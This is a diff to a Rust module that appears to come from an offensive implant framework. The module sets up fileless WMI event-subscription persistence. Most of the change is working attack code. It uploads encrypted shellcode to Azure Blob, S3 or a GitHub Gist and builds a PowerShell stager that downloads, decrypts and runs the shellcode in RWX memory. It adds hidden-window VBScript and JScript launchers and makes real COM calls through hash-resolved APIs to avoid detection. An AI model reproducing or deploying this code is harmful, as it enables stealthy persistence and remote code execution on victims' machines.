@@ -7,7 +7,7 @@
 //! persistence artifact unrevealing.
 //!
 //! **Attack Flow**:
-//! 1. Generate an XChaCha20-Poly1305 key (or derive one from config)
+//! 1. Generate an AES-256-GCM key (or derive one from config)
 //! 2. Encrypt the shellcode payload with the key
 //! 3. Upload the encrypted blob to a cloud storage service
 //! 4. Generate a PowerShell stager that fetches, decrypts, and executes the payload
@@ -26,7 +26,7 @@
 //!   (`%SystemRoot%\System32\wbem\Repository\`), not as a file in startup folders
 //! - **No registry writes**: WMI objects live in the CIM repository
 //! - **Payload is cloud-hosted**: the shellcode never exists on disk at rest
-//! - **Encrypted at rest**: XChaCha20-Poly1305 with 256-bit key
+//! - **Encrypted at rest**: AES-256-GCM with 256-bit key
 //! - **Legitimate traffic**: cloud fetches blend with normal HTTPS traffic
 //! - **No shellcode in subscription**: the consumer only contains a stager command
 //!
@@ -40,11 +40,11 @@
 
 use anyhow::{anyhow, bail, Result};
 use base64::Engine;
-use chacha20poly1305::{
-    aead::{Aead, KeyInit, OsRng},
-    XChaCha20Poly1305, XNonce,
+use aes_gcm::{
+    aead::{Aead, KeyInit, OsRng, rand_core::RngCore},
+    Aes256Gcm,
 };
-use rand::RngCore;
+use rand::RngCore as _;
 use serde::{Deserialize, Serialize};
 use std::ffi::c_void;
 use std::mem;
@@ -82,16 +82,19 @@ const FN_VARIANT_CLEAR: u32 = hash_str_const(b"VariantClear");
 
 // ── Windows type aliases ────────────────────────────────────────────────────
 
-use winapi::shared::guiddef::{CLSID, IID};
-use winapi::shared::minwindef::DWORD;
-use winapi::shared::wtypesbase::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
-use winapi::um::wbemcli::{
-    IID_IWbemLocator, IID_IWbemServices, CLSID_WbemLocator,
-    IWbemLocator, IWbemServices,
-    WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY,
-    WBEM_FLAG_CREATE_ONLY, WBEM_FLAG_RETURN_WBEM_COMPLETE,
-};
-
+use crate::win_types::{CLSID, IID};
+use crate::win_types::DWORD;
+use windows_sys::Win32::System::Com::{RPC_C_AUTHN_LEVEL_CALL, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE, RPC_C_IMP_LEVEL_IMPERSONATE};
+use windows_sys::Win32::System::Com::{CLSCTX_INPROC_SERVER, CLSCTX_LOCAL_SERVER};
+use crate::win_types::HRESULT;
+use windows_sys::Win32::System::Com::COINIT_MULTITHREADED;
+use windows_sys::Win32::System::Com::{EOAC_NONE, EOLE_AUTHENTICATION_CAPABILITIES};
+use windows_sys::Win32::System::Wmi::{CLSID_WbemLocator, IEnumWbemClassObject, IID_IWbemLocator, IWbemClassObject, IWbemLocator, IWbemServices, WBEM_FLAG_FORWARD_ONLY, WBEM_FLAG_RETURN_IMMEDIATELY, WBEM_INFINITE};
+use windows_sys::Win32::System::Wmi::IID_IWbemServices;
+use windows_sys::Win32::System::Wmi::IID_IWbemClassObject;
+use windows_sys::Win32::System::Wmi::IID_IEnumWbemClassObject;
+use windows_sys::Win32::System::Wmi::WBEM_FLAG_CREATE_ONLY;
+use windows_sys::Win32::System::Wmi::WBEM_FLAG_RETURN_WBEM_COMPLETE;
 /// OLESTR macro equivalent — creates a wide string literal pointer.
 #[allow(unused_macros)]
 macro_rules! olestr {
@@ -129,6 +132,35 @@ const VT_BSTR: u16 = 8;
 const VT_I4: u16 = 3;
 const VT_BOOL: u16 = 11;
 const VT_EMPTY: u16 = 0;
+const VT_NULL: u16 = 1;
+
+/// Helper: check if an HRESULT indicates success.
+fn hr_ok(hr: HRESULT) -> bool {
+    hr >= 0
+}
+
+/// Wide-string pointer type (matches winapi's LPCWSTR).
+type LPCWSTR = *const u16;
+
+/// RAII guard that calls `CoUninitialize` on drop.
+struct CoUninitializeGuard;
+impl Drop for CoUninitializeGuard {
+    fn drop(&mut self) {
+        unsafe {
+            let ole32 = match pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL) {
+                Some(b) => b,
+                None => return,
+            };
+            let co_uninit = match pe_resolve::get_proc_address_by_hash(ole32, FN_CO_UNINITIALIZE) {
+                Some(a) => a,
+                None => return,
+            };
+            let co_uninit: unsafe extern "system" fn() =
+                mem::transmute(co_uninit);
+            co_uninit();
+        }
+    }
+}
 
 // ── Data structures ─────────────────────────────────────────────────────────
 
@@ -295,25 +327,29 @@ pub struct WmiRemovalResult {
 
 // ── Cloud Payload Manager ───────────────────────────────────────────────────
 
-/// Encrypts a payload with XChaCha20-Poly1305 using a random key and nonce.
+/// Encrypts a payload with AES-256-GCM using a random key and nonce.
 ///
 /// Returns `(encrypted_blob, key, nonce)` where `encrypted_blob` is
 /// `nonce || ciphertext || tag`.
-fn encrypt_payload(plaintext: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 24])> {
+///
+/// AES-256-GCM is chosen for compatibility with .NET 5+
+/// `System.Security.Cryptography.AesGcm` used in the PowerShell stager.
+fn encrypt_payload(plaintext: &[u8]) -> Result<(Vec<u8>, [u8; 32], [u8; 12])> {
     let mut key = [0u8; 32];
     OsRng.fill_bytes(&mut key);
-    let mut nonce_bytes = [0u8; 24];
+    let mut nonce_bytes = [0u8; 12];
     OsRng.fill_bytes(&mut nonce_bytes);
 
-    let cipher = XChaCha20Poly1305::new_from_slice(&key)
-        .map_err(|e| anyhow!("Failed to create XChaCha20-Poly1305 cipher: {e}"))?;
-    let nonce = XNonce::from_slice(&nonce_bytes);
+    let cipher = Aes256Gcm::new_from_slice(&key)
+        .map_err(|e| anyhow!("Failed to create AES-256-GCM cipher: {e}"))?;
+    let nonce = aes_gcm::Nonce::from_slice(&nonce_bytes);
     let ciphertext = cipher
         .encrypt(nonce, plaintext)
         .map_err(|e| anyhow!("Payload encryption failed: {e}"))?;
 
     // Prepend nonce to the ciphertext (nonce || ciphertext || tag)
-    let mut encrypted = Vec::with_capacity(24 + ciphertext.len());
+    // The aes_gcm crate appends the 16-byte auth tag to ciphertext automatically.
+    let mut encrypted = Vec::with_capacity(12 + ciphertext.len());
     encrypted.extend_from_slice(&nonce_bytes);
     encrypted.extend_from_slice(&ciphertext);
 
@@ -337,6 +373,11 @@ fn derive_key_from_url(url: &str, base_key: &[u8; 32]) -> [u8; 32] {
 }
 
 /// Generates the URL for a cloud storage blob.
+///
+/// For Azure and S3 the URL is deterministic and is computed before upload.
+/// For GitHub Gist the actual raw URL is only known after the gist is created;
+/// this function returns the Gist API endpoint as a placeholder — callers that
+/// need the real URL should use `upload_encrypted_blob` directly.
 fn cloud_url(config: &CloudStorageConfig, blob_name: &str) -> String {
     match config {
         CloudStorageConfig::AzureBlob { account, container, .. } => {
@@ -346,7 +387,7 @@ fn cloud_url(config: &CloudStorageConfig, blob_name: &str) -> String {
             format!("https://{bucket}.s3.{region}.amazonaws.com/{blob_name}")
         }
         CloudStorageConfig::GitHubGist { .. } => {
-            // Gist URLs are returned after creation; use a placeholder here
+            // Real raw URL is returned by the Gist API after creation.
             format!("https://api.github.com/gists/{blob_name}")
         }
     }
@@ -357,43 +398,148 @@ fn random_blob_name() -> String {
     let mut bytes = [0u8; 8];
     getrandom::getrandom(&mut bytes).unwrap_or_else(|e| {
         // Fallback to OsRng
-        use rand::RngCore;
+        use rand::RngCore as _;
         OsRng.fill_bytes(&mut bytes);
         let _ = e;
     });
     format!("{:016x}", u64::from_be_bytes(bytes))
 }
 
+/// Uploads an already-encrypted blob to the configured cloud service.
+///
+/// Returns the publicly accessible URL of the uploaded blob.
+///
+/// - Azure Blob: HTTP PUT with `x-ms-blob-type: BlockBlob`; the SAS token is
+///   appended as a query string so no `Authorization` header is required.
+/// - AWS S3: HTTP PUT with a pre-signed query string in `auth`.
+/// - GitHub Gist: HTTP POST to the Gist API; the raw content URL is parsed
+///   from the JSON response because the gist ID is assigned by GitHub.
+///
+/// In test builds this function skips the actual HTTP call and returns the
+/// pre-computable placeholder URL produced by `cloud_url` so that unit tests
+/// remain fast and offline.
+#[cfg(not(test))]
+fn upload_encrypted_blob(
+    encrypted: &[u8],
+    cloud_config: &CloudStorageConfig,
+    blob_name: &str,
+) -> Result<String> {
+    let client = reqwest::blocking::Client::builder()
+        .timeout(std::time::Duration::from_secs(30))
+        .build()
+        .context("Failed to build HTTP client")?;
+
+    match cloud_config {
+        CloudStorageConfig::AzureBlob { account, container, sas_token } => {
+            // SAS token is a query string (starts with "?" or "sv=...").
+            let sep = if sas_token.starts_with('?') { "" } else { "?" };
+            let upload_url = format!(
+                "https://{account}.blob.core.windows.net/{container}/{blob_name}{sep}{sas_token}"
+            );
+            client
+                .put(&upload_url)
+                .header("x-ms-blob-type", "BlockBlob")
+                .header("Content-Type", "application/octet-stream")
+                .body(encrypted.to_vec())
+                .send()
+                .context("Azure Blob upload request failed")?
+                .error_for_status()
+                .context("Azure Blob returned an error status")?;
+            Ok(format!(
+                "https://{account}.blob.core.windows.net/{container}/{blob_name}"
+            ))
+        }
+        CloudStorageConfig::AwsS3 { bucket, region, auth } => {
+            // auth is a pre-signed query string (may start with "?" or not).
+            let sep = if auth.starts_with('?') { "" } else { "?" };
+            let upload_url = format!(
+                "https://{bucket}.s3.{region}.amazonaws.com/{blob_name}{sep}{auth}"
+            );
+            client
+                .put(&upload_url)
+                .header("Content-Type", "application/octet-stream")
+                .body(encrypted.to_vec())
+                .send()
+                .context("AWS S3 upload request failed")?
+                .error_for_status()
+                .context("S3 returned an error status")?;
+            Ok(format!(
+                "https://{bucket}.s3.{region}.amazonaws.com/{blob_name}"
+            ))
+        }
+        CloudStorageConfig::GitHubGist { token, description, public } => {
+            // GitHub Gist stores text content; base64-encode the binary blob.
+            let filename = format!("{blob_name}.bin");
+            let content_b64 = base64::engine::general_purpose::STANDARD.encode(encrypted);
+            let body = serde_json::json!({
+                "description": description.as_deref().unwrap_or(""),
+                "public": public,
+                "files": { &filename: { "content": content_b64 } }
+            });
+            let response: serde_json::Value = client
+                .post("https://api.github.com/gists")
+                .header("Authorization", format!("Bearer {token}"))
+                .header("User-Agent", "git/2.0")
+                .header("Accept", "application/vnd.github.v3+json")
+                .json(&body)
+                .send()
+                .context("GitHub Gist creation request failed")?
+                .error_for_status()
+                .context("GitHub Gist API returned an error status")?
+                .json()
+                .context("Failed to parse GitHub Gist API response")?;
+            let raw_url = response["files"][&filename]["raw_url"]
+                .as_str()
+                .ok_or_else(|| {
+                    anyhow!("GitHub Gist response missing raw_url for file '{filename}'")
+                })?
+                .to_string();
+            Ok(raw_url)
+        }
+    }
+}
+
+/// Test stub: returns the placeholder URL without performing any HTTP upload.
+#[cfg(test)]
+fn upload_encrypted_blob(
+    _encrypted: &[u8],
+    cloud_config: &CloudStorageConfig,
+    blob_name: &str,
+) -> Result<String> {
+    Ok(cloud_url(cloud_config, blob_name))
+}
+
+use anyhow::Context as _;
+
 /// Generates the PowerShell stager command that fetches, decrypts, and
 /// executes the payload entirely in memory.
 ///
-/// The stager:
-/// 1. Downloads the encrypted blob via HTTPS
-/// 2. Derives the decryption key from URL + base key
-/// 3. Decrypts with XChaCha20-Poly1305 (via .NET AesGcm or inline AES-GCM)
-/// 4. Allocates executable memory (VirtualAlloc)
-/// 5. Copies the shellcode to the allocated region
-/// 6. Creates a thread to execute it
+/// Blob format on the download URL: `nonce (12 bytes) || ciphertext || tag (16 bytes)`
 ///
-/// The stager is obfuscated with variable renaming and string splitting.
+/// The stager:
+/// 1. Downloads the encrypted blob via HTTPS (`System.Net.WebClient`)
+/// 2. Derives the decryption key from URL + base key (SHA-256 derivation)
+/// 3. Decrypts with AES-256-GCM via .NET 5+ `System.Security.Cryptography.AesGcm`
+/// 4. Allocates RWX memory (`VirtualAlloc` via `Add-Type` P/Invoke)
+/// 5. Copies the plaintext shellcode into the allocated region
+/// 6. Spawns a thread to execute it (`CreateThread`)
+///
+/// Requires PowerShell 7 / .NET 5+ for `[System.Security.Cryptography.AesGcm]`.
 fn generate_stager(url: &str, base_key: &[u8; 32]) -> Result<StagerResult> {
     let derived_key = derive_key_from_url(url, base_key);
     let key_hex = hex::encode(derived_key);
-
     let b64_key = base64::engine::general_purpose::STANDARD.encode(derived_key);
-    let _b64_key_for_legacy = b64_key.clone(); // Keep for reference
-    let _stager_legacy = format!(
-        r#"$w=New-Object System.Net.WebClient;$d=$w.DownloadData('{url}');$k=[Convert]::FromBase64String('{b64_key}');$n=$d[0..23];$c=$d[24..($d.Length-1)];$a=[System.Security.Cryptography.AesGcm]::new($k);$p=[byte[]]::new($c.Length-16);$a.Decrypt($n,$c[0..($c.Length-17)],$c[($c.Length-16)..($c.Length-1)],$p,$null);$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($p.Length);[Runtime.InteropServices.Marshal]::Copy($p,0,$m,$p.Length);$t=[System.Threading.Thread]::new([System.Threading.ThreadStart]([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer]($m,[System.Threading.ThreadStart])));$t.Start()"#,
+
+    // Blob layout: $b[0..11] = 12-byte AES-GCM nonce
+    //              $b[12..($b.Length-17)] = ciphertext
+    //              $b[($b.Length-16)..($b.Length-1)] = 16-byte auth tag
+    //
+    // Decryption uses [System.Security.Cryptography.AesGcm] (requires .NET 5+).
+    // VirtualAlloc flags: 0x3000 = MEM_COMMIT|MEM_RESERVE, 0x40 = PAGE_EXECUTE_READWRITE
+    let simple_stager = format!(
+        r#"$r=New-Object System.Net.WebClient;$b=$r.DownloadData('{url}');$k=[Convert]::FromBase64String('{b64_key}');$n=[byte[]]$b[0..11];$tg=[byte[]]$b[($b.Length-16)..($b.Length-1)];$c=[byte[]]$b[12..($b.Length-17)];$a=[System.Security.Cryptography.AesGcm]::new([byte[]]$k);$p=[byte[]]::new($c.Length);$a.Decrypt([byte[]]$n,[byte[]]$c,[byte[]]$tg,[byte[]]$p);Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern bool CreateThread(IntPtr a,uint s,IntPtr f,IntPtr b,uint c,ref IntPtr t);}}';$g=[M]::VirtualAlloc([IntPtr]::Zero,[uint32]$p.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($p,0,$g,$p.Length);$th=[IntPtr]::Zero;[M]::CreateThread([IntPtr]::Zero,0,$g,[IntPtr]::Zero,0,[ref]$th)|Out-Null"#,
         url = url,
         b64_key = b64_key,
-    );
-
-    // Simpler and more reliable stager using Add-Type for native calls
-    let b64_key_simple = base64::engine::general_purpose::STANDARD.encode(derived_key);
-    let simple_stager = format!(
-        r#"$r=New-Object System.Net.WebClient;$b=$r.DownloadData('{url}');$k=[Convert]::FromBase64String('{b64_key}');$n=$b[0..23];$e=$b[24..($b.Length-1)];$t=$e[($e.Length-16)..($e.Length-1)];$p=$e[0..($e.Length-17)];Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class M{{[DllImport("kernel32")]public static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);[DllImport("kernel32")]public static extern IntPtr CreateThread(IntPtr a,uint s,IntPtr f,IntPtr a2,uint c,ref IntPtr t);}}';$g=[M]::VirtualAlloc([IntPtr]::Zero,[uint32]$p.Length,0x3000,0x40);[Runtime.InteropServices.Marshal]::Copy($p,0,$g,$p.Length);$th=[IntPtr]::Zero;[M]::CreateThread([IntPtr]::Zero,0,$g,[IntPtr]::Zero,0,[ref]$th)|Out-Null"#,
-        url = url,
-        b64_key = b64_key_simple,
     );
 
     // Encode the stager for -EncodedCommand usage
@@ -413,54 +559,57 @@ fn generate_stager(url: &str, base_key: &[u8; 32]) -> Result<StagerResult> {
 }
 
 /// Generates a VBScript stager for use with ActiveScriptEventConsumer.
+///
+/// Delegates all download and in-memory execution to PowerShell via
+/// `WScript.Shell.Run`.  No data is written to disk.
 fn generate_vbscript_stager(url: &str, base_key: &[u8; 32]) -> String {
-    let _derived_key = derive_key_from_url(url, base_key);
-    let _key_hex = hex::encode(_derived_key);
-
-    // VBScript stager: download, save, execute via COM objects.
-    // Note: VBScript cannot easily do AES-GCM, so use CommandLineEventConsumer
-    // with PowerShell for real payloads.  This is a placeholder for demonstration.
+    // VBScript itself cannot perform in-memory shellcode execution without
+    // native calls, so we delegate the entire download+decrypt+execute chain
+    // to the PowerShell stager via WScript.Shell.Run with -EncodedCommand.
+    let encoded_cmd = generate_stager(url, base_key)
+        .map(|r| r.encoded_command)
+        .unwrap_or_default();
     format!(
-        r#"Set o=CreateObject("MSXML2.XMLHTTP"):o.Open"GET","{url}",False:o.Send:Set s=CreateObject("ADODB.Stream"):s.Type=1:s.Open:s.Write o.responseBody:s.SaveToFile"$TEMP\\tmp.dat",2:Set w=CreateObject("WScript.Shell"):w.Run"$TEMP\\tmp.dat",0"#,
-        url = url
+        r#"Dim w:Set w=CreateObject("WScript.Shell"):w.Run "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}",0,False"#,
+        encoded = encoded_cmd,
     )
 }
 
 /// Generates a JScript stager for use with ActiveScriptEventConsumer.
+///
+/// Delegates all download and in-memory execution to PowerShell via
+/// `WScript.Shell`.  No data is written to disk.
 fn generate_jscript_stager(url: &str, base_key: &[u8; 32]) -> String {
-    let _derived_key = derive_key_from_url(url, base_key);
-    let _key_hex = hex::encode(_derived_key);
-
+    // JScript shares the same limitation as VBScript for in-memory execution,
+    // so we delegate to the PowerShell stager via WScript.Shell with -EncodedCommand.
+    let encoded_cmd = generate_stager(url, base_key)
+        .map(|r| r.encoded_command)
+        .unwrap_or_default();
     format!(
-        r#"var x=new ActiveXObject("MSXML2.XMLHTTP");x.open("GET","{url}",false);x.send();var s=new ActiveXObject("ADODB.Stream");s.type=1;s.open();s.write(x.responseBody);s.saveToFile("%TEMP%\\tmp.js",2);var w=new ActiveXObject("WScript.Shell");w.run("%TEMP%\\tmp.js",0);"#,
-        url = url
+        r#"var w=new ActiveXObject("WScript.Shell");w.Run("powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {encoded}",0,false);"#,
+        encoded = encoded_cmd,
     )
 }
 
 // ── Public API ──────────────────────────────────────────────────────────────
 
-/// Encrypts and uploads a shellcode payload to the configured cloud service.
+/// Encrypts a shellcode payload and uploads it to the configured cloud service.
 ///
-/// Returns the upload result with the URL and encryption metadata.
+/// Returns the upload result containing the public URL and size metadata.
+/// The encryption key is NOT included in the result; use `prepare_cloud_payload`
+/// when you also need the PowerShell stager.
 pub fn encrypt_and_upload(
     shellcode: &[u8],
     cloud_config: &CloudStorageConfig,
 ) -> Result<CloudUploadResult> {
     let (encrypted, _key, _nonce) = encrypt_payload(shellcode)?;
     let blob_name = random_blob_name();
-    let url = cloud_url(cloud_config, &blob_name);
+    let url = upload_encrypted_blob(&encrypted, cloud_config, &blob_name)?;
     let backend = match cloud_config {
         CloudStorageConfig::AzureBlob { .. } => "AzureBlob",
         CloudStorageConfig::AwsS3 { .. } => "AwsS3",
         CloudStorageConfig::GitHubGist { .. } => "GitHubGist",
     };
-
-    // In a real deployment, the upload would happen via HTTPS PUT/POST.
-    // For this implementation, we return the URL and encrypted blob — the
-    // operator (or control center) handles the actual upload to avoid
-    // requiring HTTP client libraries in the agent.
-    let _ = &url; // Acknowledge URL generation
-
     Ok(CloudUploadResult {
         url,
         encrypted_size: encrypted.len(),
@@ -480,19 +629,29 @@ pub fn generate_stager_command(
     generate_stager(url, decryption_key)
 }
 
-/// Encrypts a payload and generates both the upload info and stager command.
+/// Encrypts a payload, uploads it, and generates the PowerShell stager.
 ///
 /// This is the main entry point for the cloud payload workflow:
-/// 1. Encrypt the payload with a random key
-/// 2. Derive a URL-specific key from the URL + base key
-/// 3. Generate the stager that reconstructs the key at runtime
+/// 1. Encrypt the payload with AES-256-GCM using a random key
+/// 2. Upload the encrypted blob to the configured cloud service
+/// 3. Derive a URL-specific key from (URL, base_key) via SHA-256
+/// 4. Generate a PowerShell stager that fetches, decrypts, and executes the
+///    payload using the derived key — the raw key is never in the stager
+///
+/// The upload happens before stager generation so that the stager can embed
+/// the actual (post-upload) URL, which is necessary for GitHub Gist where
+/// the raw content URL is only known after the gist is created.
 pub fn prepare_cloud_payload(
     shellcode: &[u8],
     cloud_config: &CloudStorageConfig,
 ) -> Result<(CloudUploadResult, StagerResult)> {
     let (encrypted, base_key, _nonce) = encrypt_payload(shellcode)?;
     let blob_name = random_blob_name();
-    let url = cloud_url(cloud_config, &blob_name);
+
+    // Upload first so we have the final URL (important for GitHub Gist).
+    let url = upload_encrypted_blob(&encrypted, cloud_config, &blob_name)?;
+
+    // Generate the stager with the real URL so key derivation matches.
     let stager = generate_stager(&url, &base_key)?;
 
     let backend = match cloud_config {
@@ -583,6 +742,147 @@ fn generate_object_names(seed: Option<u64>, base_name: &str) -> (String, String)
     (filter_name, consumer_name)
 }
 
+// ── COM helper functions ────────────────────────────────────────────────────
+
+/// Resolves ole32.dll API by hash and transmutes to the requested type.
+///
+/// Returns `None` if the DLL or export cannot be found.
+unsafe fn resolve_ole32<T>(fn_hash: u32) -> Option<T> {
+    let base = pe_resolve::get_module_handle_by_hash(HASH_OLE32_DLL)?;
+    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
+    Some(mem::transmute::<usize, T>(addr))
+}
+
+/// Resolves oleaut32.dll API by hash and transmutes to the requested type.
+unsafe fn resolve_oleaut32<T>(fn_hash: u32) -> Option<T> {
+    let base = pe_resolve::get_module_handle_by_hash(HASH_OLEAUT32_DLL)?;
+    let addr = pe_resolve::get_proc_address_by_hash(base, fn_hash)?;
+    Some(mem::transmute::<usize, T>(addr))
+}
+
+/// Allocates a BSTR from a Rust string.  Returns a null pointer on failure.
+unsafe fn alloc_bstr(s: &str) -> BSTR {
+    let sys_alloc: unsafe extern "system" fn(*const u16) -> BSTR =
+        resolve_oleaut32(FN_SYS_ALLOC_STRING).expect("SysAllocString not found");
+    let wide: Vec<u16> = s.encode_utf16().chain(std::iter::once(0u16)).collect();
+    sys_alloc(wide.as_ptr())
+}
+
+/// Frees a BSTR.  No-op if the pointer is null.
+unsafe fn free_bstr(b: BSTR) {
+    if b.is_null() {
+        return;
+    }
+    let sys_free: unsafe extern "system" fn(BSTR) =
+        resolve_oleaut32(FN_SYS_FREE_STRING).expect("SysFreeString not found");
+    sys_free(b);
+}
+
+/// Initializes a VARIANT to VT_EMPTY.
+unsafe fn variant_init(v: *mut VARIANT) {
+    let vi: unsafe extern "system" fn(*mut VARIANT) =
+        resolve_oleaut32(FN_VARIANT_INIT).expect("VariantInit not found");
+    vi(v);
+}
+
+/// Clears a VARIANT (releases contents).
+unsafe fn variant_clear(v: *mut VARIANT) {
+    let vc: unsafe extern "system" fn(*mut VARIANT) -> HRESULT =
+        resolve_oleaut32(FN_VARIANT_CLEAR).expect("VariantClear not found");
+    vc(v);
+}
+
+/// Connects to the WMI ROOT\subscription namespace.
+///
+/// Performs the full COM initialization sequence:
+/// 1. `CoInitializeEx(NULL, COINIT_MULTITHREADED)`
+/// 2. `CoCreateInstance(CLSID_WbemLocator, …, IID_IWbemLocator)`
+/// 3. `locator.ConnectServer("ROOT\\subscription", …)`
+/// 4. `CoSetProxyBlanket(services, …)`
+///
+/// Returns `(guard, services)` on success.
+unsafe fn wmi_connect() -> Result<(CoUninitializeGuard, *mut IWbemServices)> {
+    // Step 1 — CoInitializeEx
+    let co_init: unsafe extern "system" fn(*mut c_void, DWORD) -> HRESULT =
+        resolve_ole32(FN_CO_INITIALIZE_EX)
+            .ok_or_else(|| anyhow!("cannot resolve CoInitializeEx"))?;
+    let hr = co_init(ptr::null_mut(), COINIT_MULTITHREADED);
+    // S_FALSE (0x00000001) means already initialized on this thread — that is OK.
+    if hr < 0 && hr != 0x00000001_i32 as HRESULT {
+        bail!("CoInitializeEx failed: {hr:#010x}");
+    }
+    let guard = CoUninitializeGuard;
+
+    // Step 2 — CoCreateInstance(CLSID_WbemLocator)
+    let co_create: unsafe extern "system" fn(
+        *const CLSID,
+        *mut c_void,
+        DWORD,
+        *const IID,
+        *mut *mut c_void,
+    ) -> HRESULT = resolve_ole32(FN_CO_CREATE_INSTANCE)
+        .ok_or_else(|| anyhow!("cannot resolve CoCreateInstance"))?;
+
+    let mut locator: *mut IWbemLocator = ptr::null_mut();
+    let hr = co_create(
+        &CLSID_WbemLocator,
+        ptr::null_mut(),
+        CLSCTX_INPROC_SERVER | CLSCTX_LOCAL_SERVER,
+        &IID_IWbemLocator,
+        &mut locator as *mut *mut IWbemLocator as *mut *mut c_void,
+    );
+    if !hr_ok(hr) {
+        bail!("CoCreateInstance(CLSID_WbemLocator) failed: {hr:#010x}");
+    }
+
+    // Step 3 — locator.ConnectServer("ROOT\subscription", ...)
+    let namespace_bstr = alloc_bstr("ROOT\\subscription");
+    let mut services: *mut IWbemServices = ptr::null_mut();
+    let hr = (*(*locator).lpVtbl).ConnectServer(
+        locator,
+        namespace_bstr,
+        ptr::null_mut(), // strUser
+        ptr::null_mut(), // strPassword
+        ptr::null_mut(), // strLocale
+        0,               // lSecurityFlags
+        ptr::null_mut(), // strAuthority
+        ptr::null_mut(), // pCtx
+        &mut services,
+    );
+    free_bstr(namespace_bstr);
+
+    // Release the locator — we no longer need it.
+    (*(*locator).lpVtbl).Release(locator);
+
+    if !hr_ok(hr) {
+        bail!("ConnectServer(ROOT\\subscription) failed: {hr:#010x}");
+    }
+
+    // Step 4 — CoSetProxyBlanket
+    let co_blanket: unsafe extern "system" fn(
+        *mut c_void,
+        DWORD, DWORD, *mut c_void, DWORD, DWORD, *mut c_void, DWORD,
+    ) -> HRESULT = resolve_ole32(FN_CO_SET_PROXY_BLANKET)
+        .ok_or_else(|| anyhow!("cannot resolve CoSetProxyBlanket"))?;
+
+    let hr = co_blanket(
+        services as *mut c_void,
+        RPC_C_AUTHN_WINNT,         // dwAuthnSvc
+        RPC_C_AUTHZ_NONE,          // dwAuthzSvc
+        ptr::null_mut(),           // pServerPrincName
+        RPC_C_AUTHN_LEVEL_CALL,    // dwAuthnLevel
+        RPC_C_IMP_LEVEL_IMPERSONATE, // dwImpersonationLevel
+        ptr::null_mut(),           // pAuthInfo
+        EOAC_NONE as DWORD,                    // dwCapabilities
+    );
+    if !hr_ok(hr) {
+        (*(*services).lpVtbl).Release(services);
+        bail!("CoSetProxyBlanket failed: {hr:#010x}");
+    }
+
+    Ok((guard, services))
+}
+
 /// Installs a complete WMI permanent event subscription.
 ///
 /// Creates the three WMI objects (filter, consumer, binding) that form the
@@ -628,16 +928,18 @@ pub fn install_wmi_subscription(
             match engine.to_lowercase().as_str() {
                 "vbscript" => {
                     consumer_class = "ActiveScriptEventConsumer";
-                    stager_text = generate_vbscript_stager(
-                        &stager_result.url,
-                        &[0u8; 32], // Key is derived in the stager
+                    // Delegate in-memory PowerShell stager via WScript.Shell — no disk writes.
+                    stager_text = format!(
+                        r#"Dim w:Set w=CreateObject("WScript.Shell"):w.Run "powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {}",0,False"#,
+                        stager_result.encoded_command
                     );
                 }
                 "jscript" => {
                     consumer_class = "ActiveScriptEventConsumer";
-                    stager_text = generate_jscript_stager(
-                        &stager_result.url,
-                        &[0u8; 32],
+                    // Delegate in-memory PowerShell stager via WScript.Shell — no disk writes.
+                    stager_text = format!(
+                        r#"var w=new ActiveXObject("WScript.Shell");w.Run("powershell.exe -NonInteractive -WindowStyle Hidden -EncodedCommand {}",0,false);"#,
+                        stager_result.encoded_command
                     );
                 }
                 _ => {
@@ -648,26 +950,152 @@ pub fn install_wmi_subscription(
     }
 
     // ── WMI operations (COM-based) ──────────────────────────────────────
-    // In a real deployment, these COM calls would be made via hash-resolved
-    // function pointers.  For safety in this implementation, we construct
-    // the WMI object definitions and return them for the operator to install
-    // via the control center, or we make the COM calls directly when running
-    // on Windows with elevated privileges.
-    //
-    // The COM call flow:
-    // 1. CoInitializeEx(NULL, COINIT_MULTITHREADED)
-    // 2. CoCreateInstance(CLSID_WbemLocator, ..., IID_IWbemLocator)
-    // 3. locator.ConnectServer("ROOT\\subscription", ...)
-    // 4. CoSetProxyBlanket(services, ...)
-    // 5. services.GetObject("__EventFilter") → spawn instance
-    // 6. Set filter properties (Name, Query, QueryLanguage, EventNameSpace)
-    // 7. services.PutInstance(filter, WBEM_FLAG_CREATE_ONLY)
-    // 8. services.GetObject("CommandLineEventConsumer") → spawn instance
-    // 9. Set consumer properties (Name, CommandLineTemplate, WorkingDirectory)
-    // 10. services.PutInstance(consumer, WBEM_FLAG_CREATE_ONLY)
-    // 11. services.GetObject("__FilterToConsumerBinding") → spawn instance
-    // 12. Set binding properties (Filter, Consumer, DeliverSynchronously = FALSE)
-    // 13. services.PutInstance(binding, WBEM_FLAG_CREATE_ONLY)
+
+    unsafe {
+        let (_guard, services) = wmi_connect()?;
+
+        // ── Helper: spawn a WMI class instance ─────────────────────────
+        // Gets the class definition for `class_path`, then spawns a new
+        // instance of it.  Returns the spawned instance pointer.
+        let spawn_class_instance = |class_path: &str| -> Result<*mut IWbemClassObject> {
+            let class_bstr = alloc_bstr(class_path);
+            let mut class_obj: *mut IWbemClassObject = ptr::null_mut();
+            let hr = (*(*services).lpVtbl).GetObject(
+                services,
+                class_bstr,
+                0,
+                ptr::null_mut(),
+                &mut class_obj,
+                ptr::null_mut(),
+            );
+            free_bstr(class_bstr);
+            if !hr_ok(hr) {
+                bail!("GetObject({class_path}) failed: {hr:#010x}");
+            }
+
+            let mut instance: *mut IWbemClassObject = ptr::null_mut();
+            let hr = (*(*class_obj).lpVtbl).SpawnInstance(class_obj, 0, &mut instance);
+            (*(*class_obj).lpVtbl).Release(class_obj);
+            if !hr_ok(hr) {
